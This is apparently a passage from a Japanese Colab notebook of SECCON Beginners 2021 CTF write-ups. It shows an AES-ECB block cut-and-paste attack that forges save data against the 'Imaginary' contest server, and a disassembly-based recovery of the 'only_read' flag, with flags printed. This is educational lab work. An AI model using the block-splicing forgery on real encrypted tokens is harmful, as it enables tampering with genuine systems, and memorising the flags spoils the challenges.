            "b'\\x12\\xd0\\x0b\\xffa7\\xd5\\xf3\\x7f\\xcb\\xfa\\x15\\xda\\xb9E(~\\xc6\\xe5\\xf5\\x9e\\xedC/\\xd9\\xa8M\\xc3-l\\x87\\xc2\\xe9\\xcc\\xc1\\xef\\'\"C\\x13\\xb4\\x03*\\x84\\xaaQ[\\x86m&\\xcft\\x14u\\xe2L]\\xc6\\xda\\x0f\\xf3\\xdfM\\xc2\\xb6P\\x86\\xf6\\xcd\\x81|W~\\xdd4\\xff\\xf4|\\xadR\\xb5a$\\xf9\\x8e#\\xe16uo\\x00sT\\xed3\\x03\\xdf!5}rd\\x17A;\\xe0\\x1diO6\\xe9\\x8a\\xaf\\xfc\\x0c4\\x06\\xf2*\\xd1dz\\x1e\\x13\\xd6\\xf1`c'\n",
            "b'-\\x00w`+Ju4\\xc9Xy\\x85\\xaf\\xa2\\xd9\\x03\\xb94\\'\\x87c\\\\R.51\\x8fJ\\xf9\\xe6f1\\x94\\x98\\r{+\\x05J\\xa1\\xf7{&\\xd5\\xbf<`\\xb4F$\\xd2\\xd1\\x81\\xb2\\xf0\\xf5`\\xcd\\n\\xcc\\xd88%o\\xb4z\\xf0\\x0f\\x96\\xcc\\xbb\\x04\\x07F\\xbaE(\\xfa\\xd8\\xd9\\xed\\xeeZ\\x16_Izxx\\xdarF\\xbdj\\xca\\xd3\\xf8\\x08]B\\xfd\\xa9\\xe7\\x92\\xcc\\xf1\\xe0\\x85\\x1b\\xc7C\\'N\\xb6\\xa1\\x86\\xfbv\\xa2k\"y\\xed\\xd8\\rJH\\x80'\n",
            "b'\\x085\\x17\\xb6\\xc7\\x8a\\xea;\\x88\\x8a\\xae\\x12\\x11\\xaf\\xa00&\\xbcY)\\xadf\\x17\\x9fN\\xd0~x\\xe9@\\xbb6\\xe0\\xdf\\xc2\\'R\\xd3\\xfb\\x8a\\xb6\\xc7a\\x97\\xe8\\x94\\xc2\\xe0\\xcf\\x86\\x00\\xb6\\xee\\x85\\x07\\x0b\\x1b\"\\xa1(\\xaf\\xc6\\xa97D\\xdf\\x83x`\\x11\\x94\\xb8J\\x89\\xe8t\\xa5\\'3\\r\\xa5\\x0ft\\xb4\\x84\\xad\\xb5\\xdc\\xb67\\x1c\\x9b\\xb4\\xe7\\xe0\\x0c8\\x08\\x1a\\xfa\\x96C\\x9aWtZ#Y\\x18\\r\\x05\\xad\\xb9\\x11M%\\xbf\\xbf\\xb5\\xc2\\xdb\\x004\\x10\\x10\\x1b\\x8e\\xa2'\n",
            "b'\\x81\\xfa(\\xa6H\\xeb\\xd2X\\xe7\\x8b\\xd6a\\xbf~Q3L\\xb8`\\xado\\xa4m\\xae\\x14\\xbe\\x99\\xa5E\\x04Y\\x93\\x91\\xc4\\xd3\\xb1F\\xbe\\xc3=\\xf7\\xfa\\x92@\\x9b\\xf4\\x0bQ\\xf0\\x91\\xa9_T\\xe3f\\xaer\\xe9\\xed\\xcew\\xc9;h`-\\x1a\\x9d\\'j\\xd1\\xf9\\xe4\\xcbN?\\x84g \\xf2\\xe4\\xa4-\\xbc3\\x8cq\\x02\\x1cZ{\\x18\\xd3\\x8c \\x1c\"\\xea\\x9c\\x94\\x08\\xb6\\x9d\\xdfA\\xb1\\xba\\x84{\\xfdn3\\x00\\xf7R\\x08\\x9f\\xd5\\x1a\\x98_\\x18(\\xa8\\xfe\\x1e`\\xf0'\n",
            "b\"h\\xb2\\xaaR\\x1d@\\xdb\\x1a\\x05\\x1a\\xea\\x8b/SEY\\xb8\\n+\\x01\\x9a\\xb6\\xc8Tr\\xc5\\xac\\xbc#\\xeb\\xacfY\\xa2\\xd2[\\xe7H#\\x9c\\xcf\\xf9\\r\\x80\\x18\\x11Xj\\xe8\\x7f\\x9b\\xef\\xe2\\xac4S\\xfc\\xca\\x991b\\xc6\\xc1b\\xe3{\\xfe\\xb0\\xfe\\x05\\xdd;\\x97\\xf1-A\\x11Q$&\\x92\\x0fw:$\\xd5\\x83\\xb9\\x8crmy'\\xb4\\xad\\x9d\\xc2\\x14d\\x9b\\x8a{\\xee\\xdc\\xee\\x9c+\\x10\\x02\\xa9\\xf2Y\\xf9\\xf2R\\x85\\x1e:\\xca[3Y\\xed'j\\xfa\\xd99\"\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "NC-DeoZ2Iy37"
      },
      "source": [
        "##Imaginary"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "0Wxy1h1_KgdR"
      },
      "source": [
        "ソースを読むと、隠しコマンド「５」を指定するとflagが表示される。\n",
        "ただし、*save*データに「*1337i*」が必要。\n",
        "\n",
        "ところで、暗号モジュールがpycryptoだと「app.py」が通らないことが判明。どうやら「pycryptodome」がいるらしい。"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Bp1hwV-fI_SV",
        "outputId": "33e661d2-9608-4435-bc64-d23ff56e8008"
      },
      "source": [
        "!pip install pycryptodome"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Collecting pycryptodome\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/ad/16/9627ab0493894a11c68e46000dbcc82f578c8ff06bc2980dcd016aea9bd3/pycryptodome-3.10.1-cp35-abi3-manylinux2010_x86_64.whl (1.9MB)\n",
            "\u001b[K     |████████████████████████████████| 1.9MB 3.2MB/s \n",
            "\u001b[?25hInstalling collected packages: pycryptodome\n",
            "Successfully installed pycryptodome-3.10.1\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "display_data",
          "data": {
            "application/vnd.colab-display-data+json": {
              "pip_warning": {
                "packages": [
                  "Crypto"
                ]
              }
            }
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "k-WNzo2gKSqA"
      },
      "source": [
        "import json\n",
        "import os\n",
        "# from socketserver import ThreadingTCPServer, BaseRequestHandler\n",
        "from Crypto.Cipher import AES\n",
        "from Crypto.Util.Padding import pad, unpad\n",
        "# from secret import flag, key"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "sEn2StQ3MqY-"
      },
      "source": [
        "暗号をかける直前の平文を調べてみる。\n",
        "\n",
        "dict型のデータをjson.dumps()していることがわかる。"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "UB8W1lZwKSwZ",
        "outputId": "88139e86-36ea-43ce-b537-ee9ceb416282"
      },
      "source": [
        "numbers={}\n",
        "for i in range(3):\n",
        "  re = i*100\n",
        "  im = i*10\n",
        "  name = f'{re} + {im}i'\n",
        "  numbers[name] = [re, im]\n",
        "dump = pad(json.dumps(numbers).encode(), AES.block_size)\n",
        "\n",
        "print(dump)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "b'{\"0 + 0i\": [0, 0], \"100 + 10i\": [100, 10], \"200 + 20i\": [200, 20]}\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e'\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "pNFI58IGOOwS"
      },
      "source": [
        "暗号化<br>\n",
        "ただし、keyは不明なのでとりあえず適当に設定"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CEkKqQcINa14",
        "outputId": "ecbf5a94-7945-4733-94fe-4a796459e038"
      },
      "source": [
        "key = b'aaaaaaaaaaaaaaaa'\n",
        "\n",
        "cipher = AES.new(key, AES.MODE_ECB)\n",
        "enc = cipher.encrypt(dump)\n",
        "print(enc.hex().encode() + b'\\n')\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "b'93f782e68ab1f739de7cf4992b310641fe0923e1230be65ca88359379eb4f732f569abddbf20170bb48db6734f6c4c770a8fa8d71fd69d40be29b39c8cc033672aef7001bd63f7212111e6f32fe1263b\\n'\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "YCLJwR7dO6jO"
      },
      "source": [
        "次は復号\n",
        "\n",
        "もちろん、鍵は暗号化の時と同じ"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "e4cjrvvlOy0C",
        "outputId": "4a44acb6-c064-4510-8cf8-efd4492a7d40"
      },
      "source": [
        "key = b'aaaaaaaaaaaaaaaa'\n",
        "\n",
        "data = '93f782e68ab1f739de7cf4992b310641fe0923e1230be65ca88359379eb4f732f569abddbf20170bb48db6734f6c4c770a8fa8d71fd69d40be29b39c8cc033672aef7001bd63f7212111e6f32fe1263b'\n",
        "\n",
        "enc = bytes.fromhex(data)\n",
        "cipher = AES.new(key, AES.MODE_ECB)\n",
        "plaintext = unpad(cipher.decrypt(enc), AES.block_size)\n",
        "\n",
        "print(plaintext)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "b'{\"0 + 0i\": [0, 0], \"100 + 10i\": [100, 10], \"200 + 20i\": [200, 20]}'\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "n6Xq_dreTcP4"
      },
      "source": [
        "例えば、暗号文を２個繋げて復号してみると・・・"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "BSMj500hTkNq",
        "outputId": "ef2ecf3a-ec86-473b-f1c8-4ad7e801b358"
      },
      "source": [
        "key = b'aaaaaaaaaaaaaaaa'\n",
        "\n",
        "data2 = data + data\n",
        "\n",
        "enc = bytes.fromhex(data2)\n",
        "cipher = AES.new(key, AES.MODE_ECB)\n",
        "plaintext = unpad(cipher.decrypt(enc), AES.block_size)\n",
        "\n",
        "print(plaintext)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "b'{\"0 + 0i\": [0, 0], \"100 + 10i\": [100, 10], \"200 + 20i\": [200, 20]}\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e{\"0 + 0i\": [0, 0], \"100 + 10i\": [100, 10], \"200 + 20i\": [200, 20]}'\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "_BxZGTqLNC71"
      },
      "source": [
        "AES.block_sizeは16バイトだから、16バイト単位で継ぎ接ぎができる。\n",
        "\n",
        "これはECBモードの脆弱性。\n",
        "\n",
        "普通、ECBモードが使われることはないと思う。\n",
        "\n",
        "じゃあ何モードを使えば安全か？という疑問が湧くが、それは<a href=\"https://ja.wikipedia.org/wiki/%E6%9A%97%E5%8F%B7%E5%88%A9%E7%94%A8%E3%83%A2%E3%83%BC%E3%83%89\">この辺</a>を参照。"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "DAXwdkshNKnL",
        "outputId": "f0b56f15-cdd3-44ca-8483-cbc0f0598e48"
      },
      "source": [
        "AES.block_size"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "16"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 4
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "FwOP2-5w02YA"
      },
      "source": [
        "あとはいい感じでデータを作って切り貼りする。\n",
        "\n",
        "例えば、こんなデータを作って・・・"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "iZbTgUzZz96m",
        "outputId": "05ab7a39-f1a1-4727-a1cd-22d352febc3c"
      },
      "source": [
        "text = '{\"0 + 1234567i\": [0, 1234567], \"1234567890123 + 1337i\": [1234567890123, 1337]}'\n",
        "\n",
        "for i in range(0, len(text), 16):\n",
        "  print(text[i: i+16])\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "{\"0 + 1234567i\":\n",
            " [0, 1234567], \"\n",
            "1234567890123 + \n",
            "1337i\": [1234567\n",
            "890123, 1337]}\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "5U0kOxFh1McW"
      },
      "source": [
        "3行目を削除すると・・・"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "h1cQUY8I1S0-",
        "outputId": "22bd8975-d682-4937-e6c5-c34647e4cd6a"
      },
      "source": [
        "text = '{\"0 + 1234567i\": [0, 1234567], \"1234567890123 + 1337i\": [1234567890123, 1337]}'\n",
        "\n",
        "ans = \"\"\n",
        "\n",
        "for i in range(len(text)//16+1):\n",
        "  if i == 2:\n",
        "    continue\n",
        "  ans += text[i*16: i*16+16]\n",
        "\n",
        "print(ans)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "{\"0 + 1234567i\": [0, 1234567], \"1337i\": [1234567890123, 1337]}\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "YUGPB5kR3JSj"
      },
      "source": [
        "となって目的のものができる"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "QscBnovE3OCK",
        "outputId": "e0c3f175-9659-4e2f-e97b-bab9718b663f"
      },
      "source": [
        "!apt install netcat"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Reading package lists... Done\n",
            "Building dependency tree       \n",
            "Reading state information... Done\n",
            "The following additional packages will be installed:\n",
            "  netcat-traditional\n",
            "The following NEW packages will be installed:\n",
            "  netcat netcat-traditional\n",
            "0 upgraded, 2 newly installed, 0 to remove and 39 not upgraded.\n",
            "Need to get 65.1 kB of archives.\n",
            "After this operation, 157 kB of additional disk space will be used.\n",
            "Get:1 http://archive.ubuntu.com/ubuntu bionic/universe amd64 netcat-traditional amd64 1.10-41.1 [61.7 kB]\n",
            "Get:2 http://archive.ubuntu.com/ubuntu bionic/universe amd64 netcat all 1.10-41.1 [3,436 B]\n",
            "Fetched 65.1 kB in 1s (103 kB/s)\n",
            "Selecting previously unselected package netcat-traditional.\n",
            "(Reading database ... 160772 files and directories currently installed.)\n",
            "Preparing to unpack .../netcat-traditional_1.10-41.1_amd64.deb ...\n",
            "Unpacking netcat-traditional (1.10-41.1) ...\n",
            "Selecting previously unselected package netcat.\n",
            "Preparing to unpack .../netcat_1.10-41.1_all.deb ...\n",
            "Unpacking netcat (1.10-41.1) ...\n",
            "Setting up netcat-traditional (1.10-41.1) ...\n",
            "update-alternatives: using /bin/nc.traditional to provide /bin/nc (nc) in auto mode\n",
            "Setting up netcat (1.10-41.1) ...\n",
            "Processing triggers for man-db (2.8.3-2ubuntu0.1) ...\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "PNhtlElN6MgF",
        "outputId": "eac4730b-33bb-4c2c-9b31-e526c184a932"
      },
      "source": [
        "!nc imaginary.quals.beginners.seccon.jp 1337"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Welcome to Secret IMAGINARY NUMBER Store!\n",
            "1. Save a number\n",
            "2. Show numbers\n",
            "3. Import numbers\n",
            "4. Export numbers\n",
            "0. Exit\n",
            "> 1\n",
            "Real part> 0\n",
            "Imaginary part> 1234567\n",
            "1. Save a number\n",
            "2. Show numbers\n",
            "3. Import numbers\n",
            "4. Export numbers\n",
            "0. Exit\n",
            "> 1\n",
            "Real part> 1234567890123\n",
            "Imaginary part> 1337\n",
            "1. Save a number\n",
            "2. Show numbers\n",
            "3. Import numbers\n",
            "4. Export numbers\n",
            "0. Exit\n",
            "> 4\n",
            "{\"0 + 1234567i\": [0, 1234567], \"1234567890123 + 1337i\": [1234567890123, 1337]}\u0002\u0002\n",
            "Exported:\n",
            "d6e78d7f489b509d61e64ed9dec0cd968b3957478a53c6d4012f59b25fa79cd8bcf8e8bddf5f1c22f9db2688a6eaf1b9712cf584affea482cdba77dc6c642e3c162672ff6494be6640286e3ddd15c477\n",
            "1. Save a number\n",
            "2. Show numbers\n",
            "3. Import numbers\n",
            "4. Export numbers\n",
            "0. Exit\n",
            "> 0\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ymA6GQa884i5",
        "outputId": "03b14cb0-6608-4b53-ba02-de7b7583b2bd"
      },
      "source": [
        "cipher = \"d6e78d7f489b509d61e64ed9dec0cd968b3957478a53c6d4012f59b25fa79cd8bcf8e8bddf5f1c22f9db2688a6eaf1b9712cf584affea482cdba77dc6c642e3c162672ff6494be6640286e3ddd15c477\"\n",
        "\n",
        "ans = \"\"\n",
        "\n",
        "for i in range(len(cipher)//32):\n",
        "  if i == 2:\n",
        "    continue\n",
        "  ans += cipher[i*32: i*32+32]\n",
        "\n",
        "print(ans)\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "d6e78d7f489b509d61e64ed9dec0cd968b3957478a53c6d4012f59b25fa79cd8712cf584affea482cdba77dc6c642e3c162672ff6494be6640286e3ddd15c477\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "tqfCjuli9Xn-",
        "outputId": "e7fa7888-6891-4724-b1a7-19f552d27c75"
      },
      "source": [
        "!nc imaginary.quals.beginners.seccon.jp 1337"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Welcome to Secret IMAGINARY NUMBER Store!\n",
            "1. Save a number\n",
            "2. Show numbers\n",
            "3. Import numbers\n",
            "4. Export numbers\n",
            "0. Exit\n",
            "> 3\n",
            "Exported String> d6e78d7f489b509d61e64ed9dec0cd968b3957478a53c6d4012f59b25fa79cd8712cf584affea482cdba77dc6c642e3c162672ff6494be6640286e3ddd15c477\n",
            "Imported.\n",
            "--------------------------------------------------\n",
            "0 + 1234567i: (0, 1234567)\n",
            "1337i: (1234567890123, 1337)\n",
            "--------------------------------------------------\n",
            "1. Save a number\n",
            "2. Show numbers\n",
            "3. Import numbers\n",
            "4. Export numbers\n",
            "0. Exit\n",
            "> 5\n",
            "Congratulations!\n",
            "The flag is ctf4b{yeah_you_are_a_member_of_imaginary_number_club}\n",
            "1. Save a number\n",
            "2. Show numbers\n",
            "3. Import numbers\n",
            "4. Export numbers\n",
            "0. Exit\n",
            "> 0\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Qao7SsCgdJcE"
      },
      "source": [
        "#reversing"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "iwHAoMVxGDgQ"
      },
      "source": [
        "##only_read"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "egTpnSEJGI4B"
      },
      "source": [
        "main関数を逆アセンブリして観察"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "m96QrzOjAF_s",
        "outputId": "d0d896f3-258c-4e51-cc59-4a62756c535a"
      },
      "source": [
        "!objdump -d -M intel /content/drive/MyDrive/seccon4b2021/only_read/chall | sed '/<main>:/,/^$/!d'"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "0000000000001189 <main>:\n",
            "    1189:\tf3 0f 1e fa          \tendbr64 \n",
            "    118d:\t55                   \tpush   rbp\n",
            "    118e:\t48 89 e5             \tmov    rbp,rsp\n",
            "    1191:\t48 83 ec 20          \tsub    rsp,0x20\n",
            "    1195:\t64 48 8b 04 25 28 00 \tmov    rax,QWORD PTR fs:0x28\n",
            "    119c:\t00 00 \n",
            "    119e:\t48 89 45 f8          \tmov    QWORD PTR [rbp-0x8],rax\n",
            "    11a2:\t31 c0                \txor    eax,eax\n",
            "    11a4:\t48 c7 45 e0 00 00 00 \tmov    QWORD PTR [rbp-0x20],0x0\n",
            "    11ab:\t00 \n",
            "    11ac:\t48 c7 45 e8 00 00 00 \tmov    QWORD PTR [rbp-0x18],0x0\n",
            "    11b3:\t00 \n",
            "    11b4:\tc7 45 f0 00 00 00 00 \tmov    DWORD PTR [rbp-0x10],0x0\n",
            "    11bb:\t66 c7 45 f4 00 00    \tmov    WORD PTR [rbp-0xc],0x0\n",
            "    11c1:\tc6 45 f6 00          \tmov    BYTE PTR [rbp-0xa],0x0\n",
            "    11c5:\t48 8d 45 e0          \tlea    rax,[rbp-0x20]\n",
            "    11c9:\tba 17 00 00 00       \tmov    edx,0x17\n",
            "    11ce:\t48 89 c6             \tmov    rsi,rax\n",
            "    11d1:\tbf 00 00 00 00       \tmov    edi,0x0\n",
            "    11d6:\te8 b5 fe ff ff       \tcall   1090 <read@plt>\n",
            "    11db:\tc6 44 05 e0 00       \tmov    BYTE PTR [rbp+rax*1-0x20],0x0\n",
            "    11e0:\t0f b6 45 e0          \tmovzx  eax,BYTE PTR [rbp-0x20]\n",
            "    11e4:\t3c 63                \tcmp    al,0x63\n",
            "    11e6:\t0f 85 da 00 00 00    \tjne    12c6 <main+0x13d>\n",
            "    11ec:\t0f b6 45 e1          \tmovzx  eax,BYTE PTR [rbp-0x1f]\n",
            "    11f0:\t3c 74                \tcmp    al,0x74\n",
            "    11f2:\t0f 85 ce 00 00 00    \tjne    12c6 <main+0x13d>\n",
            "    11f8:\t0f b6 45 e2          \tmovzx  eax,BYTE PTR [rbp-0x1e]\n",
            "    11fc:\t3c 66                \tcmp    al,0x66\n",
            "    11fe:\t0f 85 c2 00 00 00    \tjne    12c6 <main+0x13d>\n",
            "    1204:\t0f b6 45 e3          \tmovzx  eax,BYTE PTR [rbp-0x1d]\n",
            "    1208:\t3c 34                \tcmp    al,0x34\n",
            "    120a:\t0f 85 b6 00 00 00    \tjne    12c6 <main+0x13d>\n",
            "    1210:\t0f b6 45 e4          \tmovzx  eax,BYTE PTR [rbp-0x1c]\n",
            "    1214:\t3c 62                \tcmp    al,0x62\n",
            "    1216:\t0f 85 aa 00 00 00    \tjne    12c6 <main+0x13d>\n",
            "    121c:\t0f b6 45 e5          \tmovzx  eax,BYTE PTR [rbp-0x1b]\n",
            "    1220:\t3c 7b                \tcmp    al,0x7b\n",
            "    1222:\t0f 85 9e 00 00 00    \tjne    12c6 <main+0x13d>\n",
            "    1228:\t0f b6 45 e6          \tmovzx  eax,BYTE PTR [rbp-0x1a]\n",
            "    122c:\t3c 63                \tcmp    al,0x63\n",
            "    122e:\t0f 85 92 00 00 00    \tjne    12c6 <main+0x13d>\n",
            "    1234:\t0f b6 45 e7          \tmovzx  eax,BYTE PTR [rbp-0x19]\n",
            "    1238:\t3c 30                \tcmp    al,0x30\n",
            "    123a:\t0f 85 86 00 00 00    \tjne    12c6 <main+0x13d>\n",
            "    1240:\t0f b6 45 e8          \tmovzx  eax,BYTE PTR [rbp-0x18]\n",
            "    1244:\t3c 6e                \tcmp    al,0x6e\n",
            "    1246:\t75 7e                \tjne    12c6 <main+0x13d>\n",
            "    1248:\t0f b6 45 e9          \tmovzx  eax,BYTE PTR [rbp-0x17]\n",
            "    124c:\t3c 35                \tcmp    al,0x35\n",
            "    124e:\t75 76                \tjne    12c6 <main+0x13d>\n",
            "    1250:\t0f b6 45 ea          \tmovzx  eax,BYTE PTR [rbp-0x16]\n",
            "    1254:\t3c 74                \tcmp    al,0x74\n",
            "    1256:\t75 6e                \tjne    12c6 <main+0x13d>\n",
            "    1258:\t0f b6 45 eb          \tmovzx  eax,BYTE PTR [rbp-0x15]\n",
            "    125c:\t3c 34                \tcmp    al,0x34\n",
            "    125e:\t75 66                \tjne    12c6 <main+0x13d>\n",
            "    1260:\t0f b6 45 ec          \tmovzx  eax,BYTE PTR [rbp-0x14]\n",
            "    1264:\t3c 6e                \tcmp    al,0x6e\n",
            "    1266:\t75 5e                \tjne    12c6 <main+0x13d>\n",
            "    1268:\t0f b6 45 ed          \tmovzx  eax,BYTE PTR [rbp-0x13]\n",
            "    126c:\t3c 74                \tcmp    al,0x74\n",
            "    126e:\t75 56                \tjne    12c6 <main+0x13d>\n",
            "    1270:\t0f b6 45 ee          \tmovzx  eax,BYTE PTR [rbp-0x12]\n",
            "    1274:\t3c 5f                \tcmp    al,0x5f\n",
            "    1276:\t75 4e                \tjne    12c6 <main+0x13d>\n",
            "    1278:\t0f b6 45 ef          \tmovzx  eax,BYTE PTR [rbp-0x11]\n",
            "    127c:\t3c 66                \tcmp    al,0x66\n",
            "    127e:\t75 46                \tjne    12c6 <main+0x13d>\n",
            "    1280:\t0f b6 45 f0          \tmovzx  eax,BYTE PTR [rbp-0x10]\n",
            "    1284:\t3c 30                \tcmp    al,0x30\n",
            "    1286:\t75 3e                \tjne    12c6 <main+0x13d>\n",
            "    1288:\t0f b6 45 f1          \tmovzx  eax,BYTE PTR [rbp-0xf]\n",
            "    128c:\t3c 6c                \tcmp    al,0x6c\n",
            "    128e:\t75 36                \tjne    12c6 <main+0x13d>\n",
            "    1290:\t0f b6 45 f2          \tmovzx  eax,BYTE PTR [rbp-0xe]\n",
            "    1294:\t3c 64                \tcmp    al,0x64\n",
            "    1296:\t75 2e                \tjne    12c6 <main+0x13d>\n",
            "    1298:\t0f b6 45 f3          \tmovzx  eax,BYTE PTR [rbp-0xd]\n",
            "    129c:\t3c 31                \tcmp    al,0x31\n",
            "    129e:\t75 26                \tjne    12c6 <main+0x13d>\n",
            "    12a0:\t0f b6 45 f4          \tmovzx  eax,BYTE PTR [rbp-0xc]\n",
            "    12a4:\t3c 6e                \tcmp    al,0x6e\n",
            "    12a6:\t75 1e                \tjne    12c6 <main+0x13d>\n",
            "    12a8:\t0f b6 45 f5          \tmovzx  eax,BYTE PTR [rbp-0xb]\n",
            "    12ac:\t3c 67                \tcmp    al,0x67\n",
            "    12ae:\t75 16                \tjne    12c6 <main+0x13d>\n",
            "    12b0:\t0f b6 45 f6          \tmovzx  eax,BYTE PTR [rbp-0xa]\n",
            "    12b4:\t3c 7d                \tcmp    al,0x7d\n",
            "    12b6:\t75 0e                \tjne    12c6 <main+0x13d>\n",
            "    12b8:\t48 8d 3d 45 0d 00 00 \tlea    rdi,[rip+0xd45]        # 2004 <_IO_stdin_used+0x4>\n",
            "    12bf:\te8 ac fd ff ff       \tcall   1070 <puts@plt>\n",
            "    12c4:\teb 0c                \tjmp    12d2 <main+0x149>\n",
            "    12c6:\t48 8d 3d 3f 0d 00 00 \tlea    rdi,[rip+0xd3f]        # 200c <_IO_stdin_used+0xc>\n",
            "    12cd:\te8 9e fd ff ff       \tcall   1070 <puts@plt>\n",
            "    12d2:\t90                   \tnop\n",
            "    12d3:\t48 8b 45 f8          \tmov    rax,QWORD PTR [rbp-0x8]\n",
            "    12d7:\t64 48 2b 04 25 28 00 \tsub    rax,QWORD PTR fs:0x28\n",
            "    12de:\t00 00 \n",
            "    12e0:\t74 05                \tje     12e7 <main+0x15e>\n",
            "    12e2:\te8 99 fd ff ff       \tcall   1080 <__stack_chk_fail@plt>\n",
            "    12e7:\tc9                   \tleave  \n",
            "    12e8:\tc3                   \tret    \n",
            "    12e9:\t0f 1f 80 00 00 00 00 \tnop    DWORD PTR [rax+0x0]\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "UOF2QH2JGQFG"
      },
      "source": [
        "分かること\n",
        "\n",
        "*   read関数を呼ぶ\n",
        "*   何度もcmp\n",
        "*   違ってると「12c6」へGO\n",
        "*   比較する値はalと毎回別の即値\n",
        "*   alはスタックの値を１バイトずつ順にコピー\n",
        "\n",
        "cmpを抽出してみると・・・"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "T6288O_NAfjg",
        "outputId": "41410478-8885-4b23-da16-5bc5b8b64c4b"
      },
      "source": [
        "!objdump -d -M intel /content/drive/MyDrive/seccon4b2021/only_read/chall | sed '/<main>:/,/^$/!d' | grep cmp"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "    11e4:\t3c 63                \tcmp    al,0x63\n",
            "    11f0:\t3c 74                \tcmp    al,0x74\n",
            "    11fc:\t3c 66                \tcmp    al,0x66\n",
            "    1208:\t3c 34                \tcmp    al,0x34\n",
            "    1214:\t3c 62                \tcmp    al,0x62\n",
            "    1220:\t3c 7b                \tcmp    al,0x7b\n",
            "    122c:\t3c 63                \tcmp    al,0x63\n",
            "    1238:\t3c 30                \tcmp    al,0x30\n",
            "    1244:\t3c 6e                \tcmp    al,0x6e\n",
            "    124c:\t3c 35                \tcmp    al,0x35\n",
            "    1254:\t3c 74                \tcmp    al,0x74\n",
            "    125c:\t3c 34                \tcmp    al,0x34\n",
            "    1264:\t3c 6e                \tcmp    al,0x6e\n",
            "    126c:\t3c 74                \tcmp    al,0x74\n",
            "    1274:\t3c 5f                \tcmp    al,0x5f\n",
            "    127c:\t3c 66                \tcmp    al,0x66\n",
            "    1284:\t3c 30                \tcmp    al,0x30\n",
